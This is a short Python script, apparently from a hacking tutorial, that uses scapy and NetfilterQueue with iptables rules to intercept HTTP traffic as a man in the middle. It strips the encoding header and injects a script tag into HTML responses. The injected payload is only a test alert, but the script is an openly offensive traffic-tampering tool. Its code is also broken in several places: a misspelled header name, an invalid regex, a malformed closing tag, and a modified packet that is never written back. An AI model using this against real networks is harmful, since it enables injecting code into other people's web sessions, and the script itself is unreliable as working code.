#Run this command in terminal for testing in local
#iptables -I INPUT -j NFQUEUE --queue-num 0
#iptables -I OUTPUT -j NFQUEUE --queue-num 0

# Run this command in terminal when running mitm to dns spoof
#iptables -I FORWARD -j NFQUEUE --queue-num 0

#Run iptables --flush to clear iptable rules after the program is done

import scapy.all as scapy
from netfilterqueue import NetfilterQueue
import re

def set_load(packet,load):
	packet[scapy.Raw].load=load 
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet

def process_packet(packet):
	scapy_packet = scapy.IP(packet.getpayload())
	if scapy_packet.haslayer(scapy.Raw):
		load=scapy_packet[scapy.Raw]
		if scapy_packet[scapy.TCP].dport==80:
			print("Request")
			load = re.sub("Accepy-Encoding:.*?\\r\\n","",load)
			
		elif scapy_packet[scapy.TCP].sport==80:
			print("Response")
			injection_code="<script>alert('test');</script>"
			load=load.replace("</body>",injection_code + "</body")
			content_length_search=re.search("?:Content-length:\s)(\d*)",load)
			if content_length_search and "text/html" in load:
				content_length=content_length_search.group(1)
				new_content_length=int(content_length)+len(injection_code)
				load=load.replace(content_length,str(new_content_length))

		if load!=scapy_packet[scapy.Raw].load:
				new_packet=set_load(scapy_packet,load)
	
	packet.accept()

queue=NetfilterQueue()
queue.bind(0,process_packet)
queue.run()